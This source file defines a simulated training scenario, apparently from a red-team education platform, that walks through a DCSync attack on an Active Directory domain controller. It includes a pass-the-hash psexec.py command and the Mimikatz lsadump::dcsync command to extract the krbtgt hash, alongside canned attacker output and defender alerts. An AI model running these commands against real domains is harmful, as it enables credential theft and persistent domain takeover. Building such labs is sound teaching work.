/**
 * DCSync Attack Scenario
 *
 * THIS SCENARIO ASSUMES:
 * 1. The user has compromised the 'admin' NTLM hash from
 * the Pass-the-Hash (Mission 4) scenario.
 */

export const dcsyncScenario = {
  id: 'dcsync',
  title: 'DCSync: Replicating Password Hashes',
  description:
    'Learn how attackers leverage DCSync to replicate password hashes from a domain controller.',

  // Network configuration
  network: {
    attacker: {
      ip: '10.0.0.5',
      hostname: 'kali-attacker',
      role: 'Red Team Machine'
    },
    target: {
      ip: '10.0.1.10',
      hostname: 'DC01.contoso.local',
      role: 'Domain Controller'
    },
    domain: 'contoso.local'
  },

  // Guide content for the sidebar
  guide: {
    overview: `**DCSync** allows an attacker with directory replication privileges (like a Domain Admin) to request password hashes directly from Active Directory.

**Attack Flow:**
1.  Use the 'admin' hash (from your Files tab) to gain a shell on the Domain Controller.
2.  Use Mimikatz to perform DCSync and replicate the 'krbtgt' account hash.
3.  Use the stolen 'krbtgt' hash to forge Golden Tickets.

**Why This Matters:**
DCSync is the final step to "owning" the domain. With the 'krbtgt' hash, you can forge Kerberos tickets for *any* user and maintain persistent access.`,
    steps: [
      {
        number: 1,
        title: 'Gain Shell on Domain Controller',
        description:
          'Use the "admin" NTLM hash (from your "Files" tab) to gain an administrative shell on the DC (10.0.1.10) using psexec.py.',
        command: 'psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:[HASH-FROM-FILES-TAB] admin@10.0.1.10',
        tip:
          'You are using the hash you stole from the SQL01 server in the previous mission.'
      },
      {
        number: 2,
        title: 'Perform DCSync with Mimikatz',
        description:
          'Now that you are on the DC, run Mimikatz to request the password hash of the "krbtgt" account.',
        command:
          'mimikatz.exe "lsadump::dcsync /domain:contoso.local /user:krbtgt"',
        tip: 'Replicating the KRBTGT hash is the key to creating Golden Tickets.'
      },
      {
        number: 3,
        title: 'Review the Extracted Hash',
        description:
          'The DCSync output contains the NTLM hash for the krbtgt account. This is the "master key" for the domain.',
        command: null,
        tip:
          'This hash is now in your "Files" tab. You can use it in the next mission!'
      }
    ]
  },

  // Simulation steps executed in the terminal
  steps: [
    {
      id: 1,
      expectedCommand: 'psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:[LOOT:admin] admin@10.0.1.10',
      attackerOutput: [
        '[*] Connecting to 10.0.1.10 (DC01)...',
        '[*] Using Pass-the-Hash authentication',
        '[*] Hash: 5f4dcc3b5aa765d61d8327deb882cf99',
        '[+] Authentication successful',
        '[+] Connected to DC01 as admin',
        '[*] Creating service for remote execution...',
        '[+] Service created: PSEXESVC',
        '[+] Executing command shell...',
        '[+] Command shell established',
        'C:\\Windows\\System32> hostname',
        'DC01',
        '[+] Remote execution successful. You are on the Domain Controller!'
      ],
      serverOutput: [
        '[SMB] Connection from 10.0.0.5',
        '[SMB] User: admin',
        '[SMB] Authentication: NTLM (hash-based)',
        '[SMB] Access: ADMIN$',
        '[SYSTEM] Service creation detected: PSEXESVC',
        '[SYSTEM] Remote command execution initiated',
        '[ALERT] CRITICAL: Lateral movement to Domain Controller detected!'
      ],
      delay: 500
    },
    {
      id: 2,
      // Accept multiple valid ways of invoking DCSync
      expectedCommands: [
        'mimikatz.exe "lsadump::dcsync /domain:contoso.local /user:krbtgt"',
        'mimikatz "lsadump::dcsync /domain:contoso.local /user:krbtgt"',
        'mimikatz.exe "lsadump::dcsync /domain:CONTOSO.LOCAL /user:krbtgt"',
        'mimikatz.exe "lsadump::dcsync /domain:contoso.local /user:krbtgt$"'
      ],
      // Provide helpful messages for common mistakes
      commonMistakes: [
        {
          pattern: '^mimikatz(\\.exe)?\\s+lsadump::dcsync',
          message: 'Wrap the lsadump::dcsync command in quotes: \"lsadump::dcsync /domain:contoso.local /user:krbtgt\"'
        },
        {
          pattern: '^mimikatz(\\.exe)?\\s*$',
          message: 'You need to specify the lsadump::dcsync module and provide the /domain and /user parameters.'
        }
      ],
      attackerOutput: [
        'C:\\Windows\\System32> mimikatz.exe "lsadump::dcsync /domain:contoso.local /user:krbtgt"',
        '[*] Using DCSync to replicate KRBTGT account credentials...',
        '[*] Connecting to DC01.contoso.local...',
        '[+] Authenticated with replication privileges',
        '[*] Requesting secrets for user: krbtgt',
        '[+] DCSync successful! Here are the credentials:',
        'User : krbtgt$',
        'NTLM : fffffffffffffffffffffffffffffff0',
        'LM   : aad3b435b51404eeaad3b435b51404ee',
        '[+] Hashes retrieved and stored'
      ],
      serverOutput: [
        '[DS-REPL] DRSGetNCChanges request from 10.0.1.10 (localhost)',
        '[DS-REPL] Object: krbtgt',
        '[AUDIT] Replication data request responded',
        '[ALERT] CRITICAL: A DCSync attack was performed from the Domain Controller itself!'
      ],
      delay: 700
    },
    {
      id: 3,
      expectedCommand: null,
      attackerOutput: [
        '',
        '[+] ============================================',
        '[+] DCSync Attack Summary',
        '[+] ============================================',
        '[+] Hashes extracted: 1 (krbtgt)',
        '[+] DOMAIN COMPROMISED',
        '[+] ============================================',
        '[*] Next Steps:',
        '[*] 1. Use krbtgt NTLM hash to forge a Golden Ticket',
        '[*] 2. Gain persistent, undetectable access to all systems',
        '',
        '[+] Attack successful! 🎯'
      ],
      serverOutput: [
        '',
        '[ALERT] SECURITY INCIDENT DETECTED',
        '[ALERT] KRBTGT account hash has been compromised.',
        '[ALERT] Recommend immediate (and double) KRBTGT password reset.',
        '[ALERT] All domain Kerberos tickets are now untrusted.'
      ],
      delay: 400
    }
  ]
};

export default dcsyncScenario;